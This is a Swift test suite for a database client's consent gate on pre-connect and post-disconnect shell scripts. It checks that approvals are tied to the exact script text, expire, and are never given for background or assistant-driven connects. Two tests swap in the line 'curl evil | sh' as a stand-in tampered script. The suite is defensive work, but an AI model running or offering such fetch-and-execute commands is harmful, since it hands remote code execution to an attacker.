//
//  PreConnectScriptConsentTests.swift
//  TableProTests
//

import Foundation
@testable import TablePro
import TableProTestSupport
import Testing

@MainActor
private final class ScriptQuestionSpy: PreConnectScriptAsking {
    var answer: ConsentAnswer
    private(set) var askedScripts: [String] = []
    private(set) var askedPostDisconnectScripts: [String?] = []

    init(answer: ConsentAnswer) {
        self.answer = answer
    }

    func ask(connectionName: String, script: String, postDisconnectScript: String?) async -> ConsentAnswer {
        askedScripts.append(script)
        askedPostDisconnectScripts.append(postDisconnectScript)
        return answer
    }
}

@MainActor
struct PreConnectScriptConsentTests {
    private func connection(script: String?) -> DatabaseConnection {
        var connection = TestFixtures.makeConnection(name: "Scripted")
        connection.preConnectScript = script
        return connection
    }

    @Test("A connection without a script is never asked about")
    func noScriptNeverAsks() async throws {
        let spy = ScriptQuestionSpy(answer: .declined)
        let consent = PreConnectScriptConsent(asker: spy)

        try await consent.authorize(connection(script: "  \n "), trigger: .background)

        #expect(spy.askedScripts.isEmpty)
    }

    @Test("A connect nobody asked at the gesture asks at the connect")
    func connectAsks() async {
        let cases: [(answer: ConsentAnswer, expected: PreConnectScriptConsentError?)] = [
            (.approved, nil),
            (.declined, .declined),
            (.unanswered, .unanswered)
        ]
        for testCase in cases {
            let spy = ScriptQuestionSpy(answer: testCase.answer)
            let consent = PreConnectScriptConsent(asker: spy)

            var thrown: PreConnectScriptConsentError?
            do {
                try await consent.authorize(connection(script: "echo hi"), trigger: .request)
            } catch let error as PreConnectScriptConsentError {
                thrown = error
            } catch {
                Issue.record("Unexpected error \(error)")
            }

            #expect(thrown == testCase.expected, "\(testCase.answer)")
            #expect(spy.askedScripts == ["echo hi"], "\(testCase.answer)")
        }
    }

    @Test("A connect TablePro starts on its own is refused without a prompt")
    func backgroundIsRefused() async {
        let spy = ScriptQuestionSpy(answer: .approved)
        let consent = PreConnectScriptConsent(asker: spy)

        await #expect(throws: PreConnectScriptConsentError.needsPerson) {
            try await consent.authorize(connection(script: "echo hi"), trigger: .background)
        }
        #expect(spy.askedScripts.isEmpty)
    }

    @Test("An approval from the gesture is spent by exactly one connect")
    func approvalIsSpentOnce() async throws {
        let spy = ScriptQuestionSpy(answer: .approved)
        let consent = PreConnectScriptConsent(asker: spy)
        let scripted = connection(script: "echo hi")

        #expect(await consent.confirm(scripted))
        try await consent.authorize(scripted, trigger: .background)
        #expect(spy.askedScripts.count == 1)

        await #expect(throws: PreConnectScriptConsentError.needsPerson) {
            try await consent.authorize(scripted, trigger: .background)
        }
    }

    @Test("An approval covers only the script text the person read")
    func approvalIsBoundToTheScript() async {
        let spy = ScriptQuestionSpy(answer: .approved)
        let consent = PreConnectScriptConsent(asker: spy)
        var scripted = connection(script: "echo hi")
        #expect(await consent.confirm(scripted))

        scripted.preConnectScript = "curl evil | sh"
        await #expect(throws: PreConnectScriptConsentError.needsPerson) {
            try await consent.authorize(scripted, trigger: .background)
        }
    }

    @Test("The prompt shows the post-disconnect script, and the approval covers it too")
    func approvalIsBoundToThePostDisconnectScript() async {
        let spy = ScriptQuestionSpy(answer: .approved)
        let consent = PreConnectScriptConsent(asker: spy)
        var scripted = connection(script: "vpn up")
        scripted.postDisconnectScript = "vpn down"

        #expect(await consent.confirm(scripted))
        #expect(spy.askedPostDisconnectScripts == ["vpn down"])

        scripted.postDisconnectScript = "curl evil | sh"
        await #expect(throws: PreConnectScriptConsentError.needsPerson) {
            try await consent.authorize(scripted, trigger: .background)
        }
    }

    @Test("A post-disconnect script without a pre-connect script is never offered")
    func postDisconnectAloneIsIgnored() {
        var connection = connection(script: nil)
        connection.postDisconnectScript = "vpn down"
        #expect(connection.trimmedPostDisconnectScript == nil)
        #expect(!connection.hasPreConnectScript)
    }

    @Test("An approval expires, and a withdrawn one is gone")
    func approvalExpiresAndWithdraws() async {
        let spy = ScriptQuestionSpy(answer: .approved)
        var clock = ContinuousClock.now
        let consent = PreConnectScriptConsent(asker: spy, now: { clock })
        let scripted = connection(script: "echo hi")

        #expect(await consent.confirm(scripted))
        clock = clock.advanced(by: PreConnectScriptConsent.approvalLifetime + .seconds(1))
        await #expect(throws: PreConnectScriptConsentError.needsPerson) {
            try await consent.authorize(scripted, trigger: .background)
        }

        #expect(await consent.confirm(scripted))
        consent.withdrawApproval(for: scripted.id)
        await #expect(throws: PreConnectScriptConsentError.needsPerson) {
            try await consent.authorize(scripted, trigger: .background)
        }
    }

    @Test("A declined gesture leaves no approval behind")
    func declinedGestureLeavesNothing() async {
        let spy = ScriptQuestionSpy(answer: .declined)
        let consent = PreConnectScriptConsent(asker: spy)
        let scripted = connection(script: "echo hi")

        #expect(await consent.confirm(scripted) == false)
        await #expect(throws: PreConnectScriptConsentError.needsPerson) {
            try await consent.authorize(scripted, trigger: .background)
        }
    }

    @Test("Declining is a cancel to the window, and the other refusals are failures")
    func classification() {
        #expect(ConnectionFailureClassifier.isUserCancelled(PreConnectScriptConsentError.declined))
        #expect(!ConnectionFailureClassifier.isUserCancelled(PreConnectScriptConsentError.unanswered))
        #expect(!ConnectionFailureClassifier.isUserCancelled(PreConnectScriptConsentError.needsPerson))
    }
}

/// Every route that can start a connect, driven against a real `DatabaseManager` and a fake driver,
/// with a script that leaves a file behind if it ever runs.
@MainActor
struct PreConnectScriptEntryPointTests {
    private struct Fixture {
        let manager: DatabaseManager
        let spy: ScriptQuestionSpy
        let connection: DatabaseConnection
        let marker: URL
        let cleanUp: () -> Void

        var scriptRan: Bool { FileManager.default.fileExists(atPath: marker.path) }
    }

    private func makeFixture(
        answer: ConsentAnswer,
        script: ((URL) -> String)? = nil,
        postDisconnectScript: String? = nil,
        ranPostDisconnect: RanPostDisconnectScripts = RanPostDisconnectScripts()
    ) throws -> Fixture {
        FakeMSSQLPluginRegistration.registerIfNeeded()
        let unique = UUID().uuidString
        let fileURL = FileManager.default.temporaryDirectory
            .appendingPathComponent("tablepro-preconnect-consent-\(unique).json")
        let marker = FileManager.default.temporaryDirectory
            .appendingPathComponent("tablepro-preconnect-ran-\(unique)")
        let suite = try EphemeralDefaults()
        let storage = ConnectionStorage(fileURL: fileURL, userDefaults: suite.defaults, keychain: InMemoryKeychain())
        let spy = ScriptQuestionSpy(answer: answer)
        let manager = DatabaseManager(
            connectionStorage: storage,
            preConnectScriptConsent: PreConnectScriptConsent(asker: spy),
            postDisconnectScripts: PostDisconnectScripts(run: { ranPostDisconnect.record($0) })
        )

        var connection = TestFixtures.makeConnection(name: "Scripted", type: .mssql)
        connection.username = "reporting"
        connection.preConnectScript = script?(marker) ?? "touch '\(marker.path)'"
        connection.postDisconnectScript = postDisconnectScript
        storage.addConnection(connection)
        FakeMSSQLPlugin.recordConfigurations(for: connection.id)

        let connectionId = connection.id
        return Fixture(
            manager: manager,
            spy: spy,
            connection: connection,
            marker: marker,
            cleanUp: {
                manager.driver(for: connectionId)?.disconnect()
                manager.removeSession(for: connectionId)
                FakeMSSQLPlugin.clearConfigurations(for: connectionId)
                suite.defaults.removePersistentDomain(forName: suite.suiteName)
                try? FileManager.default.removeItem(at: fileURL)
                try? FileManager.default.removeItem(at: marker)
            }
        )
    }

    private func expectNothingRan(_ fixture: Fixture) {
        #expect(!fixture.scriptRan)
        #expect(FakeMSSQLPlugin.configurations(for: fixture.connection.id).isEmpty)
        #expect(fixture.manager.session(for: fixture.connection.id) == nil)
    }

    @Test("ensureConnected asks, and a decline runs nothing")
    func ensureConnectedDeclined() async throws {
        let fixture = try makeFixture(answer: .declined)
        defer { fixture.cleanUp() }

        await #expect(throws: PreConnectScriptConsentError.declined) {
            try await fixture.manager.ensureConnected(fixture.connection)
        }
        #expect(fixture.spy.askedScripts.count == 1)
        expectNothingRan(fixture)
    }

    @Test("ensureConnected runs the script once the person approves it")
    func ensureConnectedApproved() async throws {
        let fixture = try makeFixture(answer: .approved)
        defer { fixture.cleanUp() }

        try await fixture.manager.ensureConnected(fixture.connection)
        await fixture.manager.stopHealthMonitor(for: fixture.connection.id)

        #expect(fixture.spy.askedScripts.count == 1)
        #expect(fixture.scriptRan)
        #expect(fixture.manager.driver(for: fixture.connection.id) != nil)
    }

    @Test("The pre-connect script sees the connection it opens")
    func scriptSeesTheConnection() async throws {
        let fixture = try makeFixture(answer: .approved) { marker in
            """
            printf '%s|%s|%s|%s|%s' "$TABLEPRO_CONNECTION_NAME" "$TABLEPRO_HOST" "$TABLEPRO_PORT" \
              "$TABLEPRO_USER" "$TABLEPRO_DATABASE" > '\(marker.path)'
            """
        }
        defer { fixture.cleanUp() }

        try await fixture.manager.ensureConnected(fixture.connection)
        await fixture.manager.stopHealthMonitor(for: fixture.connection.id)

        let seen = try String(contentsOf: fixture.marker, encoding: .utf8)
        let connection = fixture.connection
        #expect(seen == "Scripted|\(connection.host)|\(connection.port)|reporting|testdb")
    }

    @Test("A post-disconnect script runs once, after the session it was approved with ends")
    func postDisconnectRunsOnce() async throws {
        let ran = RanPostDisconnectScripts()
        let fixture = try makeFixture(answer: .approved, postDisconnectScript: "vpn down", ranPostDisconnect: ran)
        defer { fixture.cleanUp() }

        try await fixture.manager.ensureConnected(fixture.connection)
        await fixture.manager.stopHealthMonitor(for: fixture.connection.id)
        #expect(fixture.spy.askedPostDisconnectScripts == ["vpn down"])
        #expect(ran.scripts.isEmpty)

        await fixture.manager.disconnectSession(fixture.connection.id, origin: .userRequested)
        await fixture.manager.disconnectSession(fixture.connection.id, origin: .userRequested)
        try await waitUntil { ran.scripts.count == 1 }

        let pending = try #require(ran.scripts.first)
        #expect(pending.script == "vpn down")
        #expect(pending.context.connectionName == "Scripted")
        #expect(pending.timeoutSeconds == ConnectionScriptRunner.defaultTimeoutSeconds)
        #expect(!fixture.manager.postDisconnectScripts.isArmed(for: fixture.connection.id))
    }

    @Test("Quitting runs the post-disconnect script of every session still open")
    func quitRunsArmedScripts() async throws {
        let ran = RanPostDisconnectScripts()
        let fixture = try makeFixture(answer: .approved, postDisconnectScript: "vpn down", ranPostDisconnect: ran)
        defer { fixture.cleanUp() }

        try await fixture.manager.ensureConnected(fixture.connection)
        await fixture.manager.stopHealthMonitor(for: fixture.connection.id)
        await fixture.manager.runPostDisconnectScriptsBeforeQuit()

        #expect(ran.scripts.map(\.script) == ["vpn down"])
        #expect(fixture.manager.session(for: fixture.connection.id) != nil)
    }

    @Test("A declined pre-connect script arms no post-disconnect script")
    func declinedArmsNothing() async throws {
        let ran = RanPostDisconnectScripts()
        let fixture = try makeFixture(answer: .declined, postDisconnectScript: "vpn down", ranPostDisconnect: ran)
        defer { fixture.cleanUp() }

        await #expect(throws: PreConnectScriptConsentError.declined) {
            try await fixture.manager.ensureConnected(fixture.connection)
        }
        await fixture.manager.postDisconnectScripts.fireAllAndWait()
        #expect(ran.scripts.isEmpty)
    }

    @Test("A gesture that asked first is not asked again at the connect")
    func gestureApprovalIsNotAskedTwice() async throws {
        let fixture = try makeFixture(answer: .approved)
        defer { fixture.cleanUp() }

        #expect(await ConnectConsent.confirmIfNeeded(for: fixture.connection, manager: fixture.manager))
        try await fixture.manager.ensureConnected(fixture.connection)
        await fixture.manager.stopHealthMonitor(for: fixture.connection.id)

        #expect(fixture.spy.askedScripts.count == 1)
        #expect(fixture.scriptRan)
    }

    @Test("MCP, the assistant and AppleScript connect through the bridge, which asks")
    func bridgeConnectAsks() async throws {
        let fixture = try makeFixture(answer: .declined)
        defer { fixture.cleanUp() }
        let bridge = DatabaseAccessBridge(manager: fixture.manager)

        do {
            _ = try await bridge.connect(connectionId: fixture.connection.id)
            Issue.record("The connect went ahead without consent")
        } catch DatabaseAccessError.forbidden {
        } catch {
            Issue.record("Unexpected error \(error)")
        }
        #expect(fixture.spy.askedScripts.count == 1)
        expectNothingRan(fixture)
    }

    @Test("A bridge tool call that needs a session reports an unanswered prompt as a timeout")
    func bridgeResolveReportsTimeout() async throws {
        let fixture = try makeFixture(answer: .unanswered)
        defer { fixture.cleanUp() }
        let bridge = DatabaseAccessBridge(manager: fixture.manager)

        do {
            try await bridge.ensureConnected(fixture.connection.id)
            Issue.record("The connect went ahead without consent")
        } catch DatabaseAccessError.timeout {
        } catch {
            Issue.record("Unexpected error \(error)")
        }
        #expect(fixture.spy.askedScripts.count == 1)
        expectNothingRan(fixture)
    }

    @Test("Compare asks before it connects a side")
    func compareAsks() async throws {
        let fixture = try makeFixture(answer: .declined)
        defer { fixture.cleanUp() }

        await #expect(throws: PreConnectScriptConsentError.declined) {
            _ = try await CompareMetadataService(manager: fixture.manager).databases(for: fixture.connection)
        }
        #expect(fixture.spy.askedScripts.count == 1)
        expectNothingRan(fixture)
    }

    @Test("Copy To asks before it connects a side")
    func copyToAsks() async throws {
        let fixture = try makeFixture(answer: .declined)
        defer { fixture.cleanUp() }
        let endpoint = DatabaseEndpoint(
            scope: DatabaseScope(connectionId: fixture.connection.id, database: "testdb", schema: nil),
            connectionName: fixture.connection.name,
            databaseType: fixture.connection.type,
            safeModeLevel: .silent,
            color: .none
        )

        await #expect(throws: PreConnectScriptConsentError.declined) {
            _ = try await ObjectCopyCatalog(manager: fixture.manager)
                .objects(in: endpoint, connection: fixture.connection)
        }
        #expect(fixture.spy.askedScripts.count == 1)
        expectNothingRan(fixture)
    }

    @Test("A tunnel recovery never asks and stops at the refusal")
    func tunnelRecoveryNeverAsks() async throws {
        let fixture = try makeFixture(answer: .approved)
        defer { fixture.cleanUp() }
        let id = fixture.connection.id
        fixture.manager.injectSession(
            ConnectionSession(connection: fixture.connection, driver: MockDatabaseDriver(connection: fixture.connection)),
            for: id
        )

        let manager = fixture.manager
        let finished = await BoundedCall.result(within: .seconds(10)) { @MainActor in
            await manager.recoverDeadTunnel(
                connectionId: id,
                kind: "SSH",
                disconnectedMessage: "The SSH tunnel closed."
            )
            return true
        }

        #expect(finished == true)
        #expect(fixture.spy.askedScripts.isEmpty)
        #expect(!fixture.scriptRan)
        #expect(fixture.manager.session(for: id) == nil)
        #expect(
            fixture.manager.disconnectReason(for: id)?.info.message
                == PreConnectScriptConsentError.needsPerson.errorDescription
        )
    }

    @Test("A tab's auto-load never asks")
    func autoLoadNeverAsks() async throws {
        let fixture = try makeFixture(answer: .approved)
        defer { fixture.cleanUp() }
        let tabManager = QueryTabManager()
        let coordinator = MainContentCoordinator(
            connection: fixture.connection,
            tabManager: tabManager,
            changeManager: DataChangeManager(),
            toolbarState: ConnectionToolbarState(),
            services: Self.services(databaseManager: fixture.manager)
        )
        let tab = QueryTab(title: "orders", query: "SELECT 1", tabType: .table, tableName: "orders")
        tabManager.tabs.append(tab)
        tabManager.selectedTabId = tab.id
        let (claim, _) = coordinator.beginTabExecution(for: tab.id)

        let connected = await coordinator.connectBeforeAutoLoad(
            fixture.connection,
            claim: claim,
            trigger: .restore,
            traceToken: nil
        )

        #expect(!connected)
        #expect(fixture.spy.askedScripts.isEmpty)
        expectNothingRan(fixture)
    }

    private static func services(databaseManager: DatabaseManager) -> AppServices {
        let live = AppServices.live
        return AppServices(
            appEvents: live.appEvents,
            appSettings: live.appSettings,
            appSettingsStorage: live.appSettingsStorage,
            connectionStorage: live.connectionStorage,
            databaseManager: databaseManager,
            pluginManager: live.pluginManager,
            schemaService: live.schemaService,
            schemaRefreshService: live.schemaRefreshService,
            schemaProviderRegistry: live.schemaProviderRegistry,
            catalogChangeService: live.catalogChangeService,
            sqlFavoriteManager: live.sqlFavoriteManager,
            favoriteTablesStorage: live.favoriteTablesStorage,
            favoriteDatabasesStorage: live.favoriteDatabasesStorage,
            tableFolderStorage: live.tableFolderStorage,
            aiChatStorage: live.aiChatStorage,
            aiKeyStorage: live.aiKeyStorage,
            aiAccessApprovals: live.aiAccessApprovals,
            groupStorage: live.groupStorage,
            tagStorage: live.tagStorage,
            sshProfileStorage: live.sshProfileStorage,
            credentialProfileStorage: live.credentialProfileStorage,
            licenseManager: live.licenseManager,
            syncMetadataStorage: live.syncMetadataStorage,
            favoritesExpansionState: live.favoritesExpansionState,
            linkedFolderWatcher: live.linkedFolderWatcher,
            queryHistoryManager: live.queryHistoryManager,
            dateFormattingService: live.dateFormattingService,
            copilotService: live.copilotService,
            mcpServerManager: live.mcpServerManager,
            syncTracker: live.syncTracker,
            welcomeRouter: live.welcomeRouter
        )
    }
}

private final class RanPostDisconnectScripts: @unchecked Sendable {
    private let lock = NSLock()
    private var recorded: [PendingPostDisconnectScript] = []

    var scripts: [PendingPostDisconnectScript] {
        lock.withLock { recorded }
    }

    func record(_ script: PendingPostDisconnectScript) {
        lock.withLock { recorded.append(script) }
    }
}
